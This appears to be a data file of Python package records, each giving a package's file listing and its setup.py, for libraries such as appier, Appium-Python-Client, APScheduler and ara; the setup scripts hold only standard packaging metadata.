appier-1.29.1,0,1,1,1,0,0,0,0,MANIFEST.in PKG-INFO README.rst setup.cfg setup.py amqp.py api.py asgi.py asynchronous.py async_neo.py async_old.py base.py bus.py cache.py common.py component.py compress.py config.py controller.py crypt.py data.py defines.py exceptions.py execution.py export.py extra.py extra_neo.py extra_old.py geo.py git.py graph.py http.py legacy.py log.py meta.py mock.py model.py model_a.py mongo.py observer.py part.py preferences.py queuing.py redisdb.py request.py base.css favicon.ico base.js error.html.tpl holder.html.tpl layout.html.tpl scheduler.py serialize.py session.py settings.py smtp.py storage.py structures.py base.py cache.py config.py crypt.py data.py exceptions.py export.py graph.py http.py legacy.py log.py mock.py model.py part.py preferences.py queuing.py request.py serialize.py session.py smtp.py structures.py typesf.py util.py __init__.py typesf.py util.py validation.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt,"#!/usr/bin/python
# -*- coding: utf-8 -*-

# Hive Appier Framework
# Copyright (c) 2008-2022 Hive Solutions Lda.
#
# This file is part of Hive Appier Framework.
#
# Hive Appier Framework is free software: you can redistribute it and/or modify
# it under the terms of the Apache License as published by the Apache
# Foundation, either version 2.0 of the License, or (at your option) any
# later version.
#
# Hive Appier Framework is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# Apache License for more details.
#
# You should have received a copy of the Apache License along with
# Hive Appier Framework. If not, see <http://www.apache.org/licenses/>.

__author__ = ""João Magalhães <joamag@hive.pt>""
"""""" The author(s) of the module """"""

__version__ = ""1.0.0""
"""""" The version of the module """"""

__revision__ = ""$LastChangedRevision$""
"""""" The revision number of the module """"""

__date__ = ""$LastChangedDate$""
"""""" The last change date of the module """"""

__copyright__ = ""Copyright (c) 2008-2022 Hive Solutions Lda.""
"""""" The copyright for the module """"""

__license__ = ""Apache License, Version 2.0""
"""""" The license for the module """"""

import os
import setuptools

def read_file(path):
    if not os.path.exists(path): return None
    file = open(path, ""r"")
    try: return file.read()
    finally: file.close()

setuptools.setup(
    name = ""appier"",
    version = ""1.29.1"",
    author = ""Hive Solutions Lda."",
    author_email = ""development@hive.pt"",
    description = ""Appier Framework"",
    license = ""Apache License, Version 2.0"",
    keywords = ""appier framework web json wsgi"",
    url = ""http://appier.hive.pt"",
    zip_safe = False,
    packages = [
        ""appier"",
        ""appier.test""
    ],
    test_suite = ""appier.test"",
    package_dir = {
        """" : os.path.normpath(""src"")
    },
    package_data = {
        ""appier"" : [
            ""res/static/css/*"",
            ""res/static/images/*"",
            ""res/static/js/*"",
            ""res/templates/*""
        ]
    },
    classifiers = [
        ""Development Status :: 5 - Production/Stable"",
        ""Topic :: Utilities"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2.6"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3.0"",
        ""Programming Language :: Python :: 3.1"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7""
    ],
    long_description = read_file(""README.rst"")
)
",1
Appium-Python-Client-2.6.1,0,1,1,1,0,0,0,0,exceptions.py helper.py logger.py __init__.py adb_exec_timeout_option.py adb_port_option.py allow_delay_adb_option.py build_tools_version_option.py clear_device_logs_on_start_option.py ignore_hidden_api_policy_error_option.p logcat_filter_specs_option.py logcat_format_option.py mock_location_app_option.py remote_adb_host_option.py skip_logcat_capture_option.py suppress_kill_server_option.py __init__.py allow_test_packages_option.py android_install_timeout_option.py app_activity_option.py app_package_option.py app_wait_activity_option.py app_wait_duration_option.py app_wait_for_launch_option.py app_wait_package_option.py auto_grant_premissions_option.py enforce_app_install_option.py intent_action_option.py intent_category_option.py intent_flags_option.py optional_intent_arguments_option.py remote_apps_cache_limit_option.py uninstall_other_packages_option.py __init__.py avd_args_option.py avd_env_option.py avd_launch_timeout_option.py avd_option.py avd_ready_timeout_option.py gps_enabled_option.py network_speed_option.py __init__.py auto_webview_timeout_option.py chromedriver_args_option.py chromedriver_chrome_mapping_file_op chromedriver_disable_build_check_op chromedriver_executable_dir_option. chromedriver_executable_option.py chromedriver_ports_option.py chromedriver_port_option.py chromedriver_use_system_executable_ chrome_logging_prefs_option.py chrome_options_option.py ensure_webviews_have_pages_option.p extract_chrome_android_package_from native_web_screenshot_option.py recreate_chrome_driver_sessions_opt show_chromedriver_log_option.py webview_devtools_port_option.py __init__.py locale_script_option.py __init__.py skip_unlock_option.py unlock_key_option.py unlock_strategy_option.py unlock_success_timeout_option.py unlock_type_option.py __init__.py mjpeg_screenshot_url_option.py __init__.py disable_suppress_accessibility_servic user_profile_option.py __init__.py keystore_password_option.py keystore_path_option.py key_alias_option.py key_password_option.py no_sign_option.py use_keystore_option.py __init__.py __init__.py activity_options_option.py app_locale_option.py base.py espresso_build_config_option.py espresso_server_launch_timeout_option.py force_espresso_rebuild_option.py intent_options_option.py show_gradle_log_option.py __init__.py base.py disable_window_animation_option.py mjpeg_server_port_option.py skip_device_initialization_option.py skip_server_installation_option.py uiautomator2_server_install_timeout_o uiautomator2_server_launch_timeout_op uiautomator2_server_read_timeout_opti __init__.py __init__.py app_option.py automation_name_option.py auto_web_view_option.py base.py bundle_id_option.py clear_system_files_option.py device_name_option.py enable_performance_logging_option.py event_timings_option.py full_reset_option.py is_headless_option.py language_option.py locale_option.py new_command_timeout_option.py no_reset_option.py orientation_option.py other_apps_option.py postrun_option.py prerun_option.py print_page_source_on_find_failure_option.py skip_log_capture_option.py supports_capabilities.py system_host_option.py system_port_option.py udid_option.py __init__.py android_storage_option.py base.py firefox_options_option.py marionette_port_option.py verbosity_option.py __init__.py automatic_inspection_option.py automatic_profiling_option.py base.py device_name_option.py device_type_option.py device_udid_option.py platform_build_version_option.py platform_version_option.py use_simulator_option.py webkit_webrtc_option.py __init__.py app_install_strategy_option.py app_push_timeout_option.py localizable_strings_dir_option.py __init__.py base.py include_device_caps_to_session_info_o reset_location_service_option.py __init__.py command_timeouts_option.py launch_with_idb_option.py show_ios_log_option.py use_json_source_option.py __init__.py calendar_access_authorized_option.p calendar_format_option.py connect_hardware_keyboard_option.py custom_ssl_cert_option.py enforce_fresh_simulator_creation_op force_simulator_software_keyboard_p ios_simulator_logs_predicate_option keep_key_chains_option.py keychains_exclude_patterns_option.p permissions_option.py reduce_motion_option.py reset_on_session_start_only_option. scale_factor_option.py shutdown_other_simulators_option.py simulator_devices_set_path_option.p simulator_pasteboard_automatic_sync simulator_startup_timeout_option.py simulator_trace_pointer_option.py simulator_window_center_option.py __init__.py allow_provisioning_device_regitration_opt auto_accept_alerts_option.py auto_disimiss_alerts_option.py derived_data_path_option.py disable_automatic_screenshots_option.py force_app_launch_option.py keychain_password_option.py keychain_path_option.py max_typing_frequency_option.py mjpeg_server_port_option.py process_arguments_option.py result_bundle_path_option.py screenshot_quality_option.py should_terminate_app_option.py should_use_singleton_test_manager_option. show_xcode_log_option.py simple_is_visible_check_option.py updated_wda_bundle_id_option.py use_native_caching_strategy_option.py use_new_wda_option.py use_prebuilt_wda_option.py use_simple_build_test_option.py use_xctestrun_file_option.py wait_for_idle_timeout_option.py wait_for_quiescence_option.py wda_base_url_option.py wda_connection_timeout_option.py wda_eventloop_idle_delay_option.py wda_launch_timeout_option.py wda_local_port_option.py wda_startup_retries_option.py wda_startup_retry_interval_option.py web_driver_agent_url_option.py xcode_org_id_option.py xcode_signing_id_option.py __init__.py absolute_web_locations_option.py additional_webview_bundle_ids_option. enable_async_execute_from_https_optio full_context_list_option.py include_safari_in_webviews_option.py native_web_tap_option.py safari_garbage_collect_option.py safari_ignore_fraud_warning_option.py safari_ignore_web_hostnames_option.py safari_initial_url_option.py safari_log_all_communication_hex_dump safari_log_all_communication_option.p safari_open_links_in_background_optio safari_socket_chunk_size_option.py safari_web_inspector_max_frame_length webkit_response_timeout_option.py webview_connect_retries_option.py webview_connect_timeout_option.py __init__.py __init__.py __init__.py arguments_option.py base.py bootstrap_root_option.py environment_option.py server_startup_timeout_option.py show_server_logs_option.py skip_app_kill_option.py web_driver_agent_mac_url_option.py __init__.py __init__.py app_top_level_window_option.py app_working_dir_option.py base.py create_session_timeout_option.py expreimental_web_driver_option.py wait_for_app_launch_option.py __init__.py __init__.py __init__.py protocol.py can_execute_commands.py can_execute_scripts.py can_find_elements.py __init__.py __init__.py py.typed version.py appium_connection.py appium_service.py applicationstate.py clipboard_content_type.py command_method.py appiumby.py mobileby.py multi_action.py touch_action.py __init__.py connectiontype.py errorhandler.py action_helpers.py activities.py common.py display.py gsm.py nativekey.py network.py performance.py power.py sms.py system_bars.py __init__.py applications.py clipboard.py context.py device_time.py execute_driver.py execute_mobile_command.py hw_actions.py images_comparison.py ime.py keyboard.py location.py log_event.py remote_fs.py screen_record.py session.py settings.py __init__.py mobilecommand.py switch_to.py webdriver.py webelement.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt .DS_Store appium.common.rst appium.rst appium.webdriver.common.rst appium.webdriver.extensions.android.rst appium.webdriver.extensions.rst appium.webdriver.extensions.search_context.rst appium.webdriver.rst conf.py generate.sh index.rst make.bat Makefile README.md requirements.txt webdriver.common.rst webdriver.extensions.android.rst webdriver.extensions.rst webdriver.extensions.search_context.rst webdriver.rst appium.common.doctree appium.doctree appium.webdriver.common.doctree appium.webdriver.doctree appium.webdriver.extensions.android.doctree appium.webdriver.extensions.doctree appium.webdriver.extensions.search_context.doctree environment.pickle index.doctree .buildinfo .nojekyll appium.common.html appium.html appium.webdriver.common.html appium.webdriver.extensions.android.html appium.webdriver.extensions.html appium.webdriver.extensions.search_context.html appium.webdriver.html genindex.html index.html objects.inv py-modindex.html search.html searchindex.js appium.common.rst.txt appium.rst.txt appium.webdriver.common.rst.txt appium.webdriver.extensions.android.rst.txt appium.webdriver.extensions.rst.txt appium.webdriver.extensions.search_context.rst. appium.webdriver.rst.txt index.rst.txt basic.css badge_only.css fontawesome-webfont.eot fontawesome-webfont.svg fontawesome-webfont.ttf fontawesome-webfont.woff fontawesome-webfont.woff2 lato-bold-italic.woff lato-bold-italic.woff2 lato-bold.woff lato-bold.woff2 lato-normal-italic.woff lato-normal-italic.woff2 lato-normal.woff lato-normal.woff2 Roboto-Slab-Bold.woff Roboto-Slab-Bold.woff2 Roboto-Slab-Regular.woff Roboto-Slab-Regular.woff2 theme.css doctools.js documentation_options.js file.png jquery-3.5.1.js jquery.js badge_only.js html5shiv-printshiv.min.js html5shiv.min.js theme.js language_data.js minus.png plus.png pygments.css searchtools.js underscore-1.13.1.js underscore.js LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python

# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import io
import os

from setuptools import find_packages, setup

from appium.common.helper import library_version

setup(
    name='Appium-Python-Client',
    version=library_version(),
    description='Python client for Appium',
    long_description=io.open(os.path.join(os.path.dirname('__file__'), 'README.md'), encoding='utf-8').read(),
    long_description_content_type='text/markdown',
    keywords=['appium', 'selenium', 'selenium 4', 'python client', 'mobile automation'],
    author='Isaac Murchie',
    author_email='isaac@saucelabs.com',
    maintainer='Kazuaki Matsuo, Mykola Mokhnach, Mori Atsushi',
    url='http://appium.io/',
    package_data={'appium': ['py.typed']},
    packages=find_packages(include=['appium*']),
    license='Apache 2.0',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Environment :: Console',
        'Environment :: MacOS X',
        'Environment :: Win32 (MS Windows)',
        'Intended Audience :: Developers',
        'Intended Audience :: Other Audience',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: OS Independent',
        'Topic :: Software Development :: Quality Assurance',
        'Topic :: Software Development :: Testing',
    ],
    install_requires=['selenium ~= 4.1'],
)
",1
AppKit-0.2.8,1,1,1,1,0,0,0,0,app.py quickstart.py ui.html routing.py test_app.py __init__.py v0_2_6.py v0_2_8.py v0_2_8.pyc __init__.py __init__.pyc app.py app.pyc test_app.py __init__.py __init__.pyc dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
import os


data = list()
for d in os.walk('appkit/'):
    if len(d[2]) > 0:
        path_list = [str.join('/', os.path.join(d[0], x).split('/')[1:]) for x in d[2]]
        data.extend(path_list)

requires = ['flask', 'pygobject',]
requires.append('beautifulsoup4')  # v0_2_4 backward compatibility

setup(
    name='AppKit',
    version='0.2.8',
    description='Desktop application framework based on Webkit' +
    ' HTML5, CSS3, Javascript and Python',
    author='Nitipit Nontasuwan',
    author_email='nitipit@gmail.com',
    url='http://nitipit.github.com/appkit/',
    license='MIT',
    platforms=['Linux', ],
    keywords=['framework, html5, gnome, ui'],
    package_dir={'appkit': 'appkit'},
    packages=['appkit'],
    package_data={'appkit': data},
    install_requires=requires,
)
",1
applicationinsights-0.11.10,0,1,1,1,1,0,0,0,AsynchronousQueue.py AsynchronousSender.py Application.py AvailabilityData.py Base.py Cloud.py Data.py DataPoint.py DataPointType.py Device.py Domain.py Envelope.py EventData.py ExceptionData.py ExceptionDetails.py Internal.py Location.py MessageData.py MetricData.py Operation.py PageViewData.py PageViewPerfData.py RemoteDependencyData.py RequestData.py Session.py SeverityLevel.py StackFrame.py User.py Utils.py __init__.py NullSender.py QueueBase.py SenderBase.py SynchronousQueue.py SynchronousSender.py TelemetryChannel.py TelemetryContext.py __init__.py common.py logging.py middleware.py __init__.py enable.py __init__.py ext.py __init__.py LoggingHandler.py __init__.py WSGIApplication.py __init__.py TelemetryClient.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.md CONTRIBUTING.md LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py TestApplication.py TestData.py TestDataPoint.py TestDevice.py TestEnvelope.py TestEventData.py TestExceptionData.py TestExceptionDetails.py TestInternal.py TestLocation.py TestMessageData.py TestMetricData.py TestOperation.py TestPageViewData.py TestRemoteDependencyData.py TestRequestData.py TestSession.py TestStackFrame.py TestUser.py Utils.py __init__.py TestAsynchronousQueue.py TestAsynchronousSender.py TestQueueBase.py TestSenderBase.py TestSynchronousQueue.py TestSynchronousSender.py TestTelemetryChannel.py TestTelemetryContext.py __init__.py TestEnable.py __init__.py TestLoggingHandler.py __init__.py TestWSGIApplication.py __init__.py TestTelemetryClient.py TestTelemetryProcessor.py __init__.py __init__.py,"from setuptools import setup, find_packages  # Always prefer setuptools over distutils
from codecs import open  # To use a consistent encoding
from os import path

here = path.abspath(path.dirname(__file__))

# Get the long description from the relevant file
with open(path.join(here, 'README.rst'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='applicationinsights',

    # Versions should comply with PEP440.  For a discussion on single-sourcing
    # the version across setup.py and the project code, see
    # http://packaging.python.org/en/latest/tutorial.html#version
    version='0.11.10',

    description='This project extends the Application Insights API surface to support Python.',
    long_description=long_description,

    # The project's main homepage.
    url='https://github.com/Microsoft/ApplicationInsights-Python',
    download_url='https://github.com/Microsoft/ApplicationInsights-Python',

    # Author details
    author='Microsoft',
    author_email='appinsightssdk@microsoft.com',

    # Choose your license
    license='MIT',

    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        # How mature is this project? Common values are
        #   3 - Alpha
        #   4 - Beta
        #   5 - Production/Stable
        'Development Status :: 3 - Alpha',

        # Indicate who your project is intended for
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',

        # operating systems
        'Operating System :: OS Independent',

        # Pick your license as you wish (should match ""license"" above)
        'License :: OSI Approved :: MIT License',

        # Specify the Python versions you support here. In particular, ensure
        # that you indicate whether you support Python 2, Python 3 or both.
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],

    # What does your project relate to?
    keywords='analytics applicationinsights telemetry appinsights development',

    # You can just specify the packages manually here if your project is
    # simple. Or you can use find_packages().
    packages=find_packages(exclude=['contrib', 'docs', 'tests*']),

    test_suite='tests.applicationinsights_tests'
)

",1
appnope-0.1.3,1,1,1,1,0,0,0,0,_dummy.py _nope.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#-----------------------------------------------------------------------------
#  Copyright (C) 2013 Min RK
#
#  Distributed under the terms of the 2-clause BSD License.
#-----------------------------------------------------------------------------

from __future__ import print_function

import sys

from setuptools import setup
from setuptools.command.bdist_egg import bdist_egg


with open('appnope/__init__.py') as f:
    for line in f:
        if line.startswith('__version__'):
            __version__ = eval(line.split('=', 1)[1])
            break

class bdist_egg_disabled(bdist_egg):
    """"""Disabled version of bdist_egg

    Prevents setup.py install from performing setuptools' default easy_install,
    which it should never ever do.
    """"""
    def run(self):
        sys.exit(""Aborting implicit building of eggs. Use `pip install .` to install from source."")


with open(""README.md"") as f:
    readme = f.read()


setup_args = dict(
    name=""appnope"",
    version=__version__,
    packages=[""appnope""],
    author=""Min Ragan-Kelley"",
    author_email=""benjaminrk@gmail.com"",
    url=""http://github.com/minrk/appnope"",
    description=""Disable App Nap on macOS >= 10.9"",
    long_description=readme,
    long_description_content_type=""text/markdown"",
    license = ""BSD"",
    cmdclass = {
        'bdist_egg': bdist_egg if 'bdist_egg' in sys.argv else 'bdist_egg_disabled',
    },
    classifiers = [
        'License :: OSI Approved :: BSD License',
        'Operating System :: MacOS :: MacOS X',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
    ],
)

setup(**setup_args)
",1
APScheduler-3.9.1,0,1,1,0,1,0,0,0,ISSUE_TEMPLATE.md codeqa_test.yaml publish.yml .gitignore .mailmap .readthedocs.yml events.py asyncio.py base.py base_py3.py debug.py gevent.py pool.py tornado.py twisted.py __init__.py job.py base.py memory.py mongodb.py redis.py rethinkdb.py sqlalchemy.py zookeeper.py __init__.py asyncio.py background.py base.py blocking.py gevent.py qt.py tornado.py twisted.py __init__.py base.py combining.py expressions.py fields.py __init__.py date.py interval.py __init__.py util.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt docker-compose.yml conf.py contributing.rst extending.rst faq.rst index.rst migration.rst events.rst asyncio.rst base.rst debug.rst gevent.rst pool.rst twisted.rst job.rst base.rst memory.rst mongodb.rst redis.rst rethinkdb.rst sqlalchemy.rst zookeeper.rst asyncio.rst background.rst base.rst blocking.rst gevent.rst qt.rst tornado.rst twisted.rst schedulers.rst base.rst combining.rst cron.rst date.rst interval.rst py-modindex.rst userguide.rst versionhistory.rst processpool.py mongodb.py redis_.py rethinkdb_.py sqlalchemy_.py zookeeper.py reference.py client.py server.py asyncio_.py background.py blocking.py gevent_.py qt.py tornado_.py twisted_.py LICENSE.txt PKG-INFO README.rst setup.cfg setup.py conftest.py test_executors.py test_executors_py35.py test_expressions.py test_job.py test_jobstores.py test_schedulers.py test_triggers.py test_util.py test_util_py35.py __init__.py tox.ini,"# coding: utf-8
import os.path

from setuptools import setup, find_packages


here = os.path.dirname(__file__)
readme_path = os.path.join(here, 'README.rst')
readme = open(readme_path).read()

setup(
    name='APScheduler',
    use_scm_version={
        'version_scheme': 'post-release',
        'local_scheme': 'dirty-tag'
    },
    description='In-process task scheduler with Cron-like capabilities',
    long_description=readme,
    author=u'Alex Grönholm',
    author_email='apscheduler@nextday.fi',
    url='https://github.com/agronholm/apscheduler',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10'
    ],
    keywords='scheduling cron',
    license='MIT',
    packages=find_packages(exclude=['tests']),
    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, <4',
    setup_requires=[
        'setuptools_scm'
    ],
    install_requires=[
        'setuptools >= 0.7',
        'six >= 1.4.0',
        'pytz',
        'tzlocal >= 2.0, != 3.*'
    ],
    extras_require={
        ':python_version == ""2.7""': ['futures'],
        ':python_version < ""3.5""': ['funcsigs'],
        'asyncio:python_version == ""2.7""': ['trollius'],
        'gevent': ['gevent'],
        'mongodb': ['pymongo >= 3.0'],
        'redis': ['redis >= 3.0'],
        'rethinkdb': ['rethinkdb >= 2.4.0'],
        'sqlalchemy': ['sqlalchemy >= 0.8'],
        'tornado': ['tornado >= 4.3'],
        'twisted': ['twisted'],
        'zookeeper': ['kazoo'],
        'testing': [
            'pytest',
            'pytest-cov',
            'pytest-tornado5'
        ],
        'testing:python_version == ""2.7""': ['mock'],
        'testing:python_version == ""3.4""': ['pytest_asyncio < 0.6'],
        'testing:python_version >= ""3.5""': ['pytest_asyncio'],
        'doc': [
            'sphinx',
            'sphinx-rtd-theme',
        ],
    },
    zip_safe=False,
    entry_points={
        'apscheduler.triggers': [
            'date = apscheduler.triggers.date:DateTrigger',
            'interval = apscheduler.triggers.interval:IntervalTrigger',
            'cron = apscheduler.triggers.cron:CronTrigger',
            'and = apscheduler.triggers.combining:AndTrigger',
            'or = apscheduler.triggers.combining:OrTrigger'
        ],
        'apscheduler.executors': [
            'debug = apscheduler.executors.debug:DebugExecutor',
            'threadpool = apscheduler.executors.pool:ThreadPoolExecutor',
            'processpool = apscheduler.executors.pool:ProcessPoolExecutor',
            'asyncio = apscheduler.executors.asyncio:AsyncIOExecutor [asyncio]',
            'gevent = apscheduler.executors.gevent:GeventExecutor [gevent]',
            'tornado = apscheduler.executors.tornado:TornadoExecutor [tornado]',
            'twisted = apscheduler.executors.twisted:TwistedExecutor [twisted]'
        ],
        'apscheduler.jobstores': [
            'memory = apscheduler.jobstores.memory:MemoryJobStore',
            'sqlalchemy = apscheduler.jobstores.sqlalchemy:SQLAlchemyJobStore [sqlalchemy]',
            'mongodb = apscheduler.jobstores.mongodb:MongoDBJobStore [mongodb]',
            'rethinkdb = apscheduler.jobstores.rethinkdb:RethinkDBJobStore [rethinkdb]',
            'redis = apscheduler.jobstores.redis:RedisJobStore [redis]',
            'zookeeper = apscheduler.jobstores.zookeeper:ZooKeeperJobStore [zookeeper]'
        ]
    }
)
",1
aqtinstall-2.2.2,0,1,1,1,0,0,0,0,.flake8 archives.py combinations.json exceptions.py helper.py installer.py logging.ini metadata.py settings.ini updater.py version.py __init__.py __main__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.rst accelbubble.7z build_standalone.bat generate_azure_pipelines_matrices.py generate_combinations.py helloworld.7z jom_1_1_3.zip logging.ini openglwindow.7z redditclient.7z settings.ini steps.yml authors.rst changes.rst cli.rst CODE_OF_CONDUCT.rst conf.py configuration.rst CONTRIBUTE.rst getting_started.rst index.rst installation.rst make.bat Makefile SECURITY.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py conftest.py .gitattributes linux-android-expect.json linux-android.html linux-desktop-expect.json linux-desktop.html mac-android-expect.json mac-android.html mac-desktop-expect.json mac-desktop-tools_cmake-expect.json mac-desktop-tools_cmake-update.xml mac-desktop-tools_ifw-expect.json mac-desktop-tools_ifw-update.xml mac-desktop-tools_qtcreator-expect.json mac-desktop-tools_qtcreator-update.xml mac-desktop-tools_qtdesignstudio-expect.json mac-desktop-tools_qtdesignstudio-update.xml mac-desktop.html mac-ios-expect.json mac-ios.html mirror-expect.json mirror-first-td.html mirror-pre-a.html mirror-table-before-pre-a.html mirror-tag-in-a.html settings.ini settings_no_concurrency.ini windows-5140-expect.json windows-5140-update.xml windows-5150-expect.json windows-5150-update.xml windows-5152-src-doc-example-expect.json windows-5152-src-doc-example-update.xml windows-620-android-armv7-update.xml windows-620-expect.json windows-620-update.xml windows-android-expect.json windows-android.html windows-desktop-expect.json windows-desktop-tools-mingw-updates.xml windows-desktop-tools-qtcreator-updates.xml windows-desktop-tools_vcredist-expect.json windows-desktop-tools_vcredist-update.xml windows-desktop.html windows-winrt-expect.json windows-winrt.html test_archives.py test_cli.py test_connection.py test_doc_archives.py test_helper.py test_install.py test_list.py test_updater.py,"import setuptools
setuptools.setup()
",1
ara-1.5.8,1,1,1,0,1,0,0,0,admin.py apps.py auth.py fields.py filters.py prune.py 0001_initial.py 0002_remove_host_alias.py 0003_add_missing_result_properties.py 0004_duration_in_database.py 0005_unique_label_names.py 0006_remove_result_statuses.py 0007_add_expired_status.py 0008_playbook_controller.py 0009_latesthost.py 0010_result_delegated_to.py __init__.py models.py renderers.py serializers.py factories.py tests_auth.py tests_file.py tests_file_content.py tests_host.py tests_label.py tests_latesthost.py tests_play.py tests_playbook.py tests_prune.py tests_records.py tests_result.py tests_task.py tests_utils.py utils.py __init__.py urls.py views.py __init__.py base.py expire.py host.py play.py playbook.py record.py result.py task.py utils.py __init__.py http.py offline.py utils.py __init__.py ara_playbook.py ara_record.py ara_default.py ara_api.py admin.py apps.py context_processors.py base.py __init__.py __init__.py settings.py urls.py wsgi.py __init__.py __main__.py action_plugins.py ansible.py callback_plugins.py env.py exceptions.py lookup_plugins.py path.py plugins.py README.rst __init__.py apps.py forms.py generate.py pagination.py ara.css bootstrap-darkly.min.css bootstrap-flatly.min.css pygments-dark.css pygments-light.css favicon.ico logo.svg bootstrap.bundle.min.js jquery-3.5.1.slim.min.js README.rst base.html file.html host.html host_index.html index.html about_modal.html api_link.html cli_arguments.html host_facts.html host_facts_snippets.html host_index_row.html host_results.html nested_results.html pagination.html playbook_card.html playbook_files.html playbook_hosts.html playbook_records.html playbook_results.html playbook_status_icon.html result_status_icon.html sort_by_date.html sort_by_duration.html sort_by_name.html status_icon.html tags_list.html playbook.html record.html result.html robots.txt datetime_formatting.py diff_result.py pygments_highlights.py static_url.py truncatepath.py urls.py views.py __init__.py dependency_links.txt entry_points.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt changelog-release-notes.sh requirements.txt ansible-configuration.rst ansible-plugins-and-use-cases.rst api-configuration.rst api-documentation.rst api-security.rst api-usage.rst changelog-release-notes.rst cli.rst conf.py container-images.rst contributing.rst distributed-sqlite-backend.rst faq.rst getting-started.rst index.rst troubleshooting.rst database_graph_model.sh README recording-workflow.xml admin_panel_auth.png admin_panel_login.png admin_panel_users.png ansible-role-ara-api.png ansible-role-ara-web.png ara-quickstart-default.gif ara-quickstart-server.gif ara-with-icon.png ara.png cli-playbook-list.png code-review-ci.png gerrit-edit-patch.gif gerrit-new-patch.gif gerrit-profile.png gerrit-sign-in.png gerrit-ssh-key.png database-model.png README recording-workflow.png ubuntu-launchpad.png ui-api-browser-playbook.png ui-api-browser-playbooks.png ui-api-browser.gif ui-api-browser.png ui-reporting.gif LICENSE manage.py MANIFEST.in PKG-INFO README.rst requirements.txt setup.cfg setup.py test-requirements.txt basic.yaml container_test_tasks.yaml benchmark.yaml benchmark_tasks.yaml delegate_to.yaml failed.yaml free_strategy.yaml hosts.yaml import.yaml imported.yaml include_role.yaml incomplete.yaml lookups.yaml main.yaml imported-task.yaml main.yaml main.yaml included-task.yaml main.yaml main.yaml main.yaml ara-ops.yaml main.yaml test-ops.yaml smoke.yaml linters.sh runner-playbook.yml test_tasks.yaml distributed_sqlite_tests.yaml mysql_tests.yaml postgresql_tests.yaml with_ansible-runner.py with_container_images.yaml with_defaults.yaml with_distributed_sqlite.yaml with_fedora_packages.yaml with_mitogen.yaml with_mysql.yaml with_postgresql.yaml zuul_docs.yaml zuul_metadata.yaml zuul_post_logs.yaml zuul_post_with_mysql.yaml zuul_post_with_postgresql.yaml zuul_pre_multinode_networking.yaml zuul_publish_container_images.yaml,"#  Copyright (c) 2018 Red Hat, Inc.
#
#  This file is part of ARA: Ansible Run Analysis.
#
#  ARA is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  ARA is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with ARA.  If not, see <http://www.gnu.org/licenses/>.

import setuptools

setuptools.setup(
    setup_requires=['pbr'],
    pbr=True)
",1
